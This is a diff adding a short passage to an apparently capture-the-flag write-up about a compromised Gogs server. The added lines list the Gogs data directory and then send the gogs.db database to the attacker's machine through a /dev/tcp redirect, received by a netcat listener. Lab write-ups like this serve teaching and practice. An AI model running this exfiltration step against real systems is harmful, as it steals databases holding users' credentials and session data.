@@ -878,6 +878,27 @@ git@gpz-op26-toolkits:~/data/tmp/local-repo/10$
 
 ```
 
+```
+git@gpz-op26-toolkits:~/data$ ls /opt/gogs/data
+ls /opt/gogs/data
+avatars
+gogs.db
+sessions
+ssh
+tmp
+
+```
+
+```
+cat gogs.db > /dev/tcp/10.10.14.148/9001
+```
+
+```
+nc -lvnp 9001 > gogs.db 
+listening on [any] 9001 ...
+connect to [10.10.14.148] from (UNKNOWN) [10.129.191.32] 49798
+```
+
 
 ---
 ## User Flag
